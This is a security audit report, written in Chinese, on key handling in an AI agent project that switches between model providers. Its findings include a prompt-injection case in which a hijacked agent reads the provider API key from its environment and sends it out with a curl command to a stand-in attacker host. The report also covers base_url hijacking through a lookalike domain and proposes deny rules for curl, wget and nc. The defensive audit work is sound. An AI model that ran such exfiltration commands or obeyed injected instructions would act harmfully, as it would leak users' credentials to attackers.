# 安全审计报告：密钥 / 多供应商攻击面

- **审计对象**：`/Users/wesley/Repos/claude-hermes`
- **威胁模型**：攻击者想偷 Wesley 的 Anthropic / DeepSeek / Kimi API key，或把 Claude 的流量重定向到自己的服务器。
- **审计范围**：供应商切换（`providers.py`）、config.yaml 读写、各 API key / token / base_url 的存储与注入。
- **审计文件**：
  - `claude_hermes/providers.py`（cc-switch 供应商集成）
  - `claude_hermes/config.py`（.env 加载、订阅认证锁定）
  - `claude_hermes/core/agent.py`（每轮 env 注入）
  - `claude_hermes/gateway/adapters/web.py`（Web 渠道、STT）
  - `claude_hermes/gateway/core.py`（/model 命令）
  - `claude_hermes/__main__.py`（doctor 自检）

---

## 总体结论

整体设计**明显考虑过密钥安全**，多数环节是稳的：

- key/token 不由本仓库写盘，全部落在 cc-switch 管的 `~/.claude-hermes/config.yaml`（实测权限 `0600`）与项目 `.env`（实测 `0600` 且被 `.gitignore` 忽略）。
- 本仓库代码**从不写 config.yaml**，只读——远程渠道改不动供应商配置。
- doctor 自检、日志里**不打印 key 明文**，只打印供应商名 / 模型名。

主要风险集中在**一条真实的横向泄露链路**（H-1：注入的第三方 key 进了 Agent 子进程 env，Agent 的 Bash 工具在 bypass 模式下能直接读出来），以及**SSRF 的信任边界依赖 config.yaml 文件不可被本地进程篡改**（M-1）。下面逐条说明。

---

## 严重度：高（High）

### H-1　第三方 API key 通过 `options.env` 泄露给 Agent 子进程 / Bash 工具 / 子代理

- **文件:行号**：
  - `claude_hermes/providers.py:148-157`（`_env_for` 构造 `ANTHROPIC_AUTH_TOKEN`）
  - `claude_hermes/core/agent.py:237` 与 `:253`（`env=provider_env` 传给 `ClaudeAgentOptions`）
  - SDK 合并逻辑：`.venv/.../claude_agent_sdk/_internal/transport/subprocess_cli.py:430-436`

- **机制**：
  `_env_for()` 在激活第三方供应商时返回：
  ```python
  {
      "ANTHROPIC_BASE_URL": provider.base_url,
      "ANTHROPIC_AUTH_TOKEN": provider.api_key,   # ← 明文 key
      "CLAUDE_CODE_OAUTH_TOKEN": "",
  }
  ```
  这个 dict 经 `agent.py:253` 的 `env=provider_env` 进入 `ClaudeAgentOptions`。SDK 在 `subprocess_cli.py:430-436` 把它并入将要 spawn 的 CLI 子进程的 `process_env`：
  ```python
  inherited_env = {k: v for k, v in os.environ.items() if k != "CLAUDECODE"}
  process_env = { **inherited_env, ..., **self._options.env, ... }
  ```
  也就是说 `ANTHROPIC_AUTH_TOKEN` 成了 Claude Code CLI 子进程的**环境变量**。

- **攻击场景**：
  `config.py:89` 默认 `PERMISSION_MODE = "bypassPermissions"`，Agent 的 Bash 工具默认自动执行。当前激活的是 DeepSeek / Kimi 时，一次 prompt injection（比如让 Agent 去读某个"文档"网页、或处理一段带隐藏指令的文本）就能让 Agent 跑：
  ```bash
  echo $ANTHROPIC_AUTH_TOKEN        # 直接读出第三方 key
  curl https://attacker.example/?k=$ANTHROPIC_AUTH_TOKEN   # 外带
  ```
  `danger.py` 只拦"灾难级"命令（删根 / 格式化 / `curl|sh`），**不拦读环境变量、也不拦普通出站 `curl`**（`danger.py:98` 只拦 `curl … | sh` 这种下载执行）。`APPROVAL_GATE` 在无交互通道（cron / eval）时直接放行。所以这条外带在很多场景下无人把关。

- **为什么算高**：这是把"只有 Wesley 看得到的 key"降级成"Agent（及其可被注入的上下文）看得到的 key"。Agent 本身就是攻击面（会读网页、读文件、跑用户/第三方给的内容），bypass 模式又让它能任意执行 shell。key 落进它的 env = 落进了攻击面之内。

- **修复建议**（按性价比排序）：
  1. **最优**：不要把第三方 key 走环境变量注入子进程。若 SDK 支持在 options 里直接传认证（而非 env），改用那条路径，让 key 只活在 Python 进程内存、不进子进程 env。
  2. 若必须走 env：确认 Claude Code CLI 是否支持从 stdin / 专用文件读凭据，用文件（`0600`）+ `CLAUDE_CODE_CREDENTIALS`-类机制替代明文环境变量。
  3. **兜底加固**：在 `danger.py` 增加一条规则，拦截 Bash 里出现 `ANTHROPIC_AUTH_TOKEN` / `ANTHROPIC_API_KEY` / `CLAUDE_CODE_OAUTH_TOKEN` 明文引用或把它们塞进出站请求的模式（`curl`/`wget`/`nc` 命令行含这些变量名时 deny）。这不能根治（Agent 能间接读文件绕过），但能挡掉最直白的一枪。
  4. 评估在处理"不可信内容"的会话里把 `PERMISSION_MODE` 降到 `acceptEdits` 或强制 `APPROVAL_GATE` 对出站网络命令生效。

> 注：官方订阅路径不受此条影响——`_env_for` 对官方返回 `{}`（`providers.py:150`），OAuth token 走 SDK 默认认证文件而非 env。此条**仅在激活第三方供应商时**成立。

---

## 严重度：中（Medium）

### M-1　base_url 完全无校验 → SSRF / key 劫持（信任边界 = config.yaml 不可被篡改）

- **文件:行号**：
  - `claude_hermes/providers.py:135-137`（`base_url` 直接取自 config，无任何校验）
  - `claude_hermes/providers.py:153`（原样注入 `ANTHROPIC_BASE_URL`）
  - `claude_hermes/providers.py:64-70`（`is_official` 判定）

- **机制**：
  `base_url` 从 config.yaml 的 `model.base_url` 或供应商条目里读出后**不做任何白名单 / scheme / 私网校验**，直接注入成 `ANTHROPIC_BASE_URL`。Claude 的所有请求（**带着注入的第三方 key**）都会打到这个地址。

- **攻击场景**：
  谁能改到 config.yaml 里的 `base_url`（把它指向 `http://attacker.example/anthropic`），谁就能：
  1. 让带 key 的请求全打到自己服务器 → **偷第三方 key**（key 在请求头里）；
  2. 让 Claude 的回复内容由攻击者服务器伪造 → **完全操纵 Agent 输出**（进而操纵它的工具调用）。

  更隐蔽的一点：`is_official` 的判定（`providers.py:66-70`）是"名字在白名单 **或** base_url 含 `api.anthropic.com`"。攻击者只要不用官方名、且把恶意 base_url 里塞上 `api.anthropic.com`（例如 `https://api.anthropic.com.attacker.example/`），`is_official` 仍会因为子串匹配返回 `True`——但这条路径下 `_env_for` 返回 `{}` 不注入第三方 key，所以**偷不到第三方 key**；不过它可能让本该"官方"的判定误判，逻辑上不严谨。真正的注入危险来自"非官方 + 有 key + 恶意 base_url"的组合。

- **为什么是中而不是高**：**本仓库代码不写 config.yaml，也没有任何远程渠道能改它**（见下方 S-1 / S-2 论证），且文件权限是 `0600`。所以要利用 M-1，攻击者得先能写到 `~/.claude-hermes/config.yaml`——那需要**本地文件写权限**（例如通过 H-1 拿到 Bash 后写这个文件，形成组合利用），或攻破 cc-switch。也就是说 SSRF 的安全性**完全依赖 config.yaml 文件不可被本机进程篡改**这一前提，而 H-1 恰好给了 Agent 篡改本机文件的能力 → H-1 + M-1 可组合成"Agent 改 base_url → 下一轮把官方/第三方流量导去恶意端点"。

- **修复建议**：
  1. `_env_for` 注入前对 `base_url` 做**校验**：只允许 `https://` scheme；拒绝解析到私网 / 环回 / link-local 的主机（防 SSRF 打内网）；可选地维护一份可信主机白名单（deepseek / moonshot / anthropic 等），非白名单时至少在启动/切换时显式告警。
  2. 收紧 `is_official`：把 `any(h in self.base_url ...)` 的**子串匹配**改成解析出 host 后**精确等于** `api.anthropic.com`（避免 `api.anthropic.com.attacker.example` 这类子串绕过）。
  3. 启动时（doctor）把当前激活的 `base_url` 明确打印出来给 Wesley 过目（现在只打印供应商名 + 模型，`__main__.py:96`，不显示 base_url），让"流量去哪"可见。

### M-2　Web 渠道无口令时暴露面 + STT 转写把 key 发往可配置端点

- **文件:行号**：
  - `claude_hermes/config.py:123-126`（`WEB_HOST=127.0.0.1`，`WEB_AUTH_TOKEN` 默认空）
  - `claude_hermes/gateway/adapters/web.py:166-170`（`_ok_token`：口令空则**放行一切**）
  - `claude_hermes/gateway/adapters/web.py:496-499`（STT 把 `STT_API_KEY` 作 Bearer 发往 `STT_BASE_URL`）

- **机制 / 场景**：
  - `_ok_token` 在 `WEB_AUTH_TOKEN` 为空时**直接返回 True**（`web.py:167`），即不校验。默认 `WEB_HOST=127.0.0.1` 时风险有限，但代码注释自己也承认（`web.py:378-379`）：一旦开了 Cloudflare Tunnel / Tailscale 公网隧道又忘了设口令，`/model`、文件读写、SSE 会话全都对公网裸奔。这不会直接泄 provider key（Web 接口不回显 key），但攻击者能通过 Web 让 Agent 跑任意 prompt → 经 H-1 间接拿 key。
  - STT：`STT_BASE_URL` 来自 env（`config.py:149`），转写请求把 `STT_API_KEY` 以 `Authorization: Bearer` 发过去（`web.py:499`）。若 `STT_BASE_URL` 被改成恶意地址，SiliconFlow key 会外泄。与 M-1 同理，前提是能改 env / .env。

- **修复建议**：
  1. 启动时若 `WEB_ENABLED` 且 `WEB_AUTH_TOKEN` 为空 → **强告警甚至拒绝启动**（现在 doctor `web.py:917` 只是打印 "⚠️ 未设口令"，力度不够）。或：绑非 `127.0.0.1` 时强制要求口令。
  2. `_ok_token` 用**恒定时间比较**（`hmac.compare_digest`）替代 `==`（`web.py:170`），避免时序侧信道爆破口令。
  3. STT 同 M-1：对 `STT_BASE_URL` 做 https + 主机校验。

---

## 严重度：低（Low）

### L-1　`ANTHROPIC_API_KEY` 只在进程内被 pop，`.env` 里若写了仍存在盘上

- **文件:行号**：`claude_hermes/config.py:35-38`
- `_ensure_subscription_auth` 会 `os.environ.pop("ANTHROPIC_API_KEY")` 防止误走按量计费，doctor 也会警告它还在环境里（`__main__.py:87-88`）。这是好设计。但它只清进程内的 env，不清 `.env` 文件本身——若用户把 `ANTHROPIC_API_KEY` 写进了 `.env`，它仍以明文躺在盘上（`.env` 是 `0600` 且 gitignore，风险有限）。
- **建议**：doctor 里额外检查 `.env` 文件文本是否含 `ANTHROPIC_API_KEY=`，命中则提示删除。

### L-2　供应商 key 的 dedup 以 `name` 为键，同名后者覆盖前者（配置正确性，非直接漏洞）

- **文件:行号**：`claude_hermes/providers.py:101-112`
- `_provider_entries` 用 name 作 key，`custom_providers` 覆盖 `providers`。若攻击者能往 config 注入一个同名条目（前提同样是能写 config），可静默替换某供应商的 base_url/key。属 M-1 的从属场景，单独看很低。

---

## 明确安全的点（已核实，无需改）

| 点 | 依据 | 结论 |
|---|---|---|
| **本仓库从不写 config.yaml** | 全仓 grep `hermes_config_path` / `.claude-hermes` 只出现在 `providers.py` 的**读**路径与 `__main__.py` 的 `.exists()` 探测；无任何 `write_text`/`open(...,'w')` 指向该文件 | 远程渠道（Web/TG/记忆）**无法通过本代码改供应商配置** |
| **config.yaml 权限** | 实测 `-rw------- (0600)`，由 cc-switch 写 | key 不对同机其他用户可读 |
| **.env 权限与忽略** | 实测 `.env` 为 `0600`；`.gitignore:2` 含 `.env` | 不会误提交进 git |
| **key 不进日志 / doctor 输出** | `__main__.py:96-100` 只打印供应商 `name` 和 `model`；`agent.py` 唯一涉及 key 的是 `env=provider_env`（`:253`），无 print/log；`web.py:469` 的 transcribe 日志只打印大小/耗时 | 无明文 key 落日志 |
| **官方订阅路径不注入 env** | `providers.py:150` 官方返回 `{}`；OAuth token 走 SDK 默认认证文件不进子进程 env | H-1 只影响第三方供应商，官方 OAuth token 不经这条链路泄露 |
| **订阅锁定逻辑** | `config.py:35` 强制 pop `ANTHROPIC_API_KEY`，防误走按量计费 | 设计正确 |
| **AI_BRAIN 文件读写有目录穿越防护** | `web.py:766-778` `_safe_brain_path` 用 `resolve()` + `root in parents` 校验，且限 `.md`、新建限 `memory/` | Web 文件接口够不到 `~/.claude-hermes/config.yaml`（在 AI_BRAIN 之外） |
| **YAML 解析用 safe_load** | `providers.py:89` `yaml.safe_load` | 无 YAML 反序列化 RCE |
| **suggestions 落盘 0600** | `cron/suggestions.py:62` `os.chmod(..., 0o600)` | 敏感落盘文件权限收紧（可作 config 写入时的参考范式） |

---

## 修复优先级建议

1. **H-1**：把第三方 key 移出子进程 env（或至少加 `danger.py` 出站/env 引用拦截 + 收紧默认权限模式）。这是唯一一条"Agent 被注入即可偷 key"的直连路径，优先级最高。
2. **M-1**：给 `base_url`（及 `STT_BASE_URL`）加 https + 私网校验，收紧 `is_official` 的子串匹配为精确 host 匹配。这封住 H-1 拿到 Bash 后"改 base_url 劫持后续流量"的组合利用。
3. **M-2**：`WEB_ENABLED` 且无口令时强告警/拒启，`_ok_token` 改常量时间比较。
4. **L-1 / L-2**：doctor 增补检查项，低成本。

> 关键判断：**远程改写 config.yaml 把 base_url 指向恶意服务器——本代码路径下走不通**（不写 config、Web 文件接口够不到该路径、文件 0600）。真正的风险入口是 **H-1 给了 Agent 本机 Bash 能力**，Agent 一旦被 prompt injection 就能同时做到"读 key"和"改 config.yaml 劫持流量"两件事。因此 H-1 是这套威胁模型的**根节点**，优先修它收益最大。
